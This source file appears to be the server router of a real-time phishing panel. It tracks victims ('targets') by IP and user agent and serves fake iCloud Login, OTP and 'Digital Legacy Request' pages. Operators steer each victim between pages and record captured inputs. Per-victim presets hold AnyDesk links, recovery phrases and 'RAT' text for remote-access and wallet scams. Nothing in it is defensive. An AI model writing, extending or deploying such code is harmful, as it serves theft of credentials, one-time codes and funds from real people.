import { observable } from "@trpc/server/observable";
import { z } from "zod";
import { prisma } from "@/app/server/db/prisma";
import { publishTargetEvent, subscribeTargetEvent, targetTopic } from "@/app/server/realtime/pubsub";
import { createTRPCRouter, publicProcedure } from "./init";

function publishState(targetId, payload) {
  publishTargetEvent(targetTopic(targetId, "intake_states"), payload);
}

function publishGameplan(targetId, payload) {
  publishTargetEvent(targetTopic(targetId, "gameplans"), payload);
}

function publishEvent(targetId, payload) {
  publishTargetEvent(targetTopic(targetId, "intake_events"), payload);
}

export const appRouter = createTRPCRouter({
  targets: createTRPCRouter({
    getById: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .query(({ input }) =>
        prisma.targets.findUnique({
          where: { id: input.targetId },
        }),
      ),
    listPending: publicProcedure.query(() =>
      prisma.targets.findMany({
        where: { status: "pending" },
        orderBy: { created_at: "desc" },
      }),
    ),
    listActive: publicProcedure.query(() =>
      prisma.targets.findMany({
        where: { status: "active" },
        orderBy: { created_at: "desc" },
      }),
    ),
    accept: publicProcedure
      .input(
        z.object({
          targetId: z.string(),
          operatorId: z.string().optional(),
        }),
      )
      .mutation(async ({ input }) => {
        const updated = await prisma.targets.update({
          where: { id: input.targetId },
          data: {
            status: "active",
            operator_id: input.operatorId ?? null,
          },
        });
        publishState(input.targetId, { type: "update" });
        return updated;
      }),
    deny: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .mutation(async ({ input }) => {
        const updated = await prisma.targets.update({
          where: { id: input.targetId },
          data: { status: "ended" },
        });
        publishState(input.targetId, { type: "update" });
        return updated;
      }),
    endAndBan: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .mutation(async ({ input }) => {
        const updated = await prisma.targets.update({
          where: { id: input.targetId },
          data: { status: "banned" },
        });
        publishState(input.targetId, { type: "update" });
        return updated;
      }),
    create: publicProcedure
      .input(
        z.object({
          useragent: z.string().nullable().optional(),
          ip: z.string().nullable().optional(),
          intakePageName: z.string().optional(),
          ownerGroupId: z.string().nullable().optional(),
        }),
      )
      .mutation(async ({ input }) => {
        const createdTarget = await prisma.targets.create({
          data: {
            status: "live",
            intake_page_name: input.intakePageName ?? "iCloud",
            useragent: input.useragent ?? null,
            owner_group_id: input.ownerGroupId ?? null,
            ip: input.ip ?? null,
          },
          select: { id: true },
        });

        await prisma.intake_states.create({
          data: {
            target_id: createdTarget.id,
            gameplan_step: 0,
          },
        });

        await prisma.gameplans.create({
          data: {
            target_id: createdTarget.id,
            pages: [{ name: "Login" }, { name: "OTP" }, { name: "Success" }],
          },
        });

        publishState(createdTarget.id, { type: "init" });
        publishGameplan(createdTarget.id, { type: "init" });

        return createdTarget;
      }),
  }),

  domains: createTRPCRouter({
    getConfig: publicProcedure
      .input(z.object({ slug: z.string().optional() }))
      .query(async ({ input }) => {
        const slug = (input.slug ?? "iCloud").toLowerCase().replace(/\s+/g, "-");
        const domain = await prisma.domains.findFirst({
          where: { slug },
        });
        return domain ?? {
          id: null,
          allow_new_visitors: true,
          default_pages: [{ name: "Login" }, { name: "OTP" }, { name: "Digital Legacy Request" }, { name: "Success" }],
        };
      }),
    updateConfig: publicProcedure
      .input(
        z.object({
          slug: z.string().optional(),
          allowNewVisitors: z.boolean().optional(),
          defaultPages: z.array(z.object({ name: z.string() })).optional(),
        }),
      )
      .mutation(async ({ input }) => {
        const slug = (input.slug ?? "iCloud").toLowerCase().replace(/\s+/g, "-").replace(/[^a-z0-9-]/g, "");
        let domain = await prisma.domains.findFirst({
          where: { slug },
        });
        if (!domain) {
          domain = await prisma.domains.create({
            data: {
              name: input.slug ?? "iCloud",
              slug,
              allow_new_visitors: input.allowNewVisitors ?? true,
              default_pages: input.defaultPages ?? [{ name: "Login" }, { name: "OTP" }, { name: "Digital Legacy Request" }, { name: "Success" }],
            },
          });
        } else {
          domain = await prisma.domains.update({
            where: { id: domain.id },
            data: {
              ...(input.allowNewVisitors !== undefined && { allow_new_visitors: input.allowNewVisitors }),
              ...(input.defaultPages !== undefined && { default_pages: input.defaultPages }),
            },
          });
        }
        return domain;
      }),
  }),

  intakeState: createTRPCRouter({
    getByTarget: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .query(({ input }) =>
        prisma.intake_states.findUnique({
          where: { target_id: input.targetId },
        }),
      ),
    incrementStep: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .mutation(async ({ input }) => {
        const updated = await prisma.intake_states.update({
          where: { target_id: input.targetId },
          data: { gameplan_step: { increment: 1 } },
        });
        publishState(input.targetId, { type: "update", row: updated });
        return { data: 1, row: updated };
      }),
    setStep: publicProcedure
      .input(z.object({ targetId: z.string(), step: z.number() }))
      .mutation(async ({ input }) => {
        const updated = await prisma.intake_states.update({
          where: { target_id: input.targetId },
          data: { gameplan_step: input.step },
        });
        publishState(input.targetId, { type: "update", row: updated });
        return updated;
      }),
    setForceLoad: publicProcedure
      .input(z.object({ targetId: z.string(), forceLoad: z.boolean() }))
      .mutation(async ({ input }) => {
        const updated = await prisma.intake_states.update({
          where: { target_id: input.targetId },
          data: { force_load: input.forceLoad },
        });
        publishState(input.targetId, { type: "update", row: updated });
        return updated;
      }),
    onUpdate: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .subscription(({ input }) => {
        return observable((emit) => {
          const unsubscribe = subscribeTargetEvent(
            targetTopic(input.targetId, "intake_states"),
            (payload) => emit.next(payload),
          );
          return unsubscribe;
        });
      }),
  }),

  gameplans: createTRPCRouter({
    getByTarget: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .query(({ input }) =>
        prisma.gameplans.findUnique({
          where: { target_id: input.targetId },
        }),
      ),
    updatePages: publicProcedure
      .input(
        z.object({
          targetId: z.string(),
          pages: z.array(z.object({ name: z.string() })),
        }),
      )
      .mutation(async ({ input }) => {
        const updated = await prisma.gameplans.update({
          where: { target_id: input.targetId },
          data: { pages: input.pages },
        });
        publishGameplan(input.targetId, { type: "update", row: updated });
        return updated;
      }),
    appendPage: publicProcedure
      .input(
        z.object({
          targetId: z.string(),
          page: z.object({ name: z.string() }),
        }),
      )
      .mutation(async ({ input }) => {
        const gp = await prisma.gameplans.findUnique({
          where: { target_id: input.targetId },
        });
        if (!gp) throw new Error("Gameplan not found");
        const pages = [...(Array.isArray(gp.pages) ? gp.pages : []), input.page];
        const updated = await prisma.gameplans.update({
          where: { target_id: input.targetId },
          data: { pages },
        });
        publishGameplan(input.targetId, { type: "update", row: updated });
        return updated;
      }),
    redirectToPage: publicProcedure
      .input(
        z.object({
          targetId: z.string(),
          pageName: z.string(),
        }),
      )
      .mutation(async ({ input }) => {
        const gp = await prisma.gameplans.findUnique({
          where: { target_id: input.targetId },
        });
        if (!gp) throw new Error("Gameplan not found");
        const pages = Array.isArray(gp.pages) ? gp.pages : [];
        const idx = pages.findIndex((p) => p?.name === input.pageName);
        if (idx < 0) {
          const updated = await prisma.gameplans.update({
            where: { target_id: input.targetId },
            data: { pages: [...pages, { name: input.pageName }] },
          });
          const state = await prisma.intake_states.update({
            where: { target_id: input.targetId },
            data: { gameplan_step: pages.length },
          });
          publishGameplan(input.targetId, { type: "update", row: updated });
          publishState(input.targetId, { type: "update", row: state });
          return { gameplan: updated, state };
        }
        const state = await prisma.intake_states.update({
          where: { target_id: input.targetId },
          data: { gameplan_step: idx },
        });
        publishState(input.targetId, { type: "update", row: state });
        return { state };
      }),
    onUpdate: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .subscription(({ input }) => {
        return observable((emit) => {
          const unsubscribe = subscribeTargetEvent(
            targetTopic(input.targetId, "gameplans"),
            (payload) => emit.next(payload),
          );
          return unsubscribe;
        });
      }),
  }),

  intakeEvents: createTRPCRouter({
    listByTarget: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .query(({ input }) =>
        prisma.intake_events.findMany({
          where: { target_id: input.targetId },
          orderBy: { created_at: "asc" },
        }),
      ),
    add: publicProcedure
      .input(
        z.object({
          target_id: z.string(),
          type: z.string(),
          input_title: z.string().optional(),
          input_value: z.string().optional(),
          interaction_title: z.string().optional(),
          checkpoint_status: z.string().optional(),
          checkpoint_resolution: z.string().optional(),
          checkpoint_type: z.string().optional(),
          checkpoint_dual_outcome: z.string().optional(),
        }),
      )
      .mutation(async ({ input }) => {
        const created = await prisma.intake_events.create({
          data: input,
        });
        publishEvent(input.target_id, { type: "insert", row: created });
        return created;
      }),
    onUpdate: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .subscription(({ input }) => {
        return observable((emit) => {
          const unsubscribe = subscribeTargetEvent(
            targetTopic(input.targetId, "intake_events"),
            (payload) => emit.next(payload),
          );
          return unsubscribe;
        });
      }),
  }),

  presets: createTRPCRouter({
    getByTarget: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .query(({ input }) =>
        prisma.target_presets.findUnique({
          where: { target_id: input.targetId },
        }),
      ),
    upsert: publicProcedure
      .input(
        z.object({
          targetId: z.string(),
          numberChallenge: z.string().optional(),
          phoneEnding: z.string().optional(),
          anydeskLink: z.string().optional(),
          recoveryPhrase: z.string().optional(),
          itLink: z.string().optional(),
          ratText: z.string().optional(),
          redirectUrl: z.string().optional(),
        }),
      )
      .mutation(async ({ input }) => {
        const data = {
          number_challenge: input.numberChallenge ?? null,
          phone_ending: input.phoneEnding ?? null,
          anydesk_link: input.anydeskLink ?? null,
          recovery_phrase: input.recoveryPhrase ?? null,
          it_link: input.itLink ?? null,
          rat_text: input.ratText ?? null,
          redirect_url: input.redirectUrl ?? null,
        };
        return prisma.target_presets.upsert({
          where: { target_id: input.targetId },
          create: { target_id: input.targetId, ...data },
          update: data,
        });
      }),
  }),

  checkpoints: createTRPCRouter({
    listPendingByTarget: publicProcedure
      .input(z.object({ targetId: z.string() }))
      .query(({ input }) =>
        prisma.intake_events.findMany({
          where: {
            target_id: input.targetId,
            checkpoint_status: "waiting",
          },
          orderBy: { created_at: "desc" },
        }),
      ),
    latest: publicProcedure
      .input(
        z.object({
          targetId: z.string(),
          resolution: z.string(),
        }),
      )
      .query(async ({ input }) => {
        const event = await prisma.intake_events.findFirst({
          where: {
            target_id: input.targetId,
            checkpoint_resolution: input.resolution,
          },
          orderBy: { created_at: "desc" },
        });
        return event;
      }),
    existsWaiting: publicProcedure
      .input(
        z.object({
          targetId: z.string(),
          resolution: z.string(),
        }),
      )
      .query(async ({ input }) => {
        const count = await prisma.intake_events.count({
          where: {
            target_id: input.targetId,
            checkpoint_resolution: input.resolution,
            checkpoint_status: "waiting",
          },
        });
        return count > 0;
      }),
    resolveDual: publicProcedure
      .input(
        z.object({
          targetId: z.string(),
          resolution: z.string(),
          dualOutcome: z.string(),
        }),
      )
      .mutation(async ({ input }) => {
        const waiting = await prisma.intake_events.findFirst({
          where: {
            target_id: input.targetId,
            checkpoint_resolution: input.resolution,
            checkpoint_status: "waiting",
          },
          orderBy: { created_at: "desc" },
        });

        if (!waiting) {
          return { status: "missing" };
        }

        const updated = await prisma.intake_events.update({
          where: { id: waiting.id },
          data: {
            checkpoint_status: "resolved",
            checkpoint_dual_outcome: input.dualOutcome,
          },
        });
        publishEvent(input.targetId, { type: "update", row: updated });
        return { status: "success" };
      }),
    onResolution: publicProcedure
      .input(
        z.object({
          targetId: z.string(),
          resolution: z.string(),
        }),
      )
      .subscription(({ input }) => {
        return observable((emit) => {
          const unsubscribe = subscribeTargetEvent(
            targetTopic(input.targetId, "intake_events"),
            (payload) => {
              const row = payload?.row;
              if (
                row?.checkpoint_resolution === input.resolution &&
                row?.checkpoint_status === "resolved"
              ) {
                emit.next(payload);
              }
            },
          );
          return unsubscribe;
        });
      }),
  }),

  intakePages: createTRPCRouter({
    isActive: publicProcedure
      .input(z.object({ id: z.string() }))
      .query(async ({ input }) => {
        const page = await prisma.intake_pages.findUnique({
          where: { id: input.id },
          select: { active: true },
        });
        return page?.active ?? false;
      }),
  }),
});

export const router = appRouter;
